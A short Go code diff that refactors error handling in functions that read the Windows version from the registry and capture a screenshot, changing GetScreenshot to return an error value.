@@ -61,18 +61,16 @@ func GetUsername() string {
 
 func GetOS() string {
 	value, err := GetRegistryKeyValue(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion`, "ProductName")
-	if err != nil {
-		//return ""
+	if CheckError(err) {
+		return ""
 	}
 	return value
 }
 
-func GetScreenshot() *image.RGBA {
+func GetScreenshot() (*image.RGBA, error) {
 	img, err := screenshot.CaptureScreen()
-	if err != nil {
-		OutMessage(err.Error())
-	}
-	return img
+	CheckError(err)
+	return img, err
 }
 
 func ImageToBytes(image *image.RGBA) ([]byte, error) {
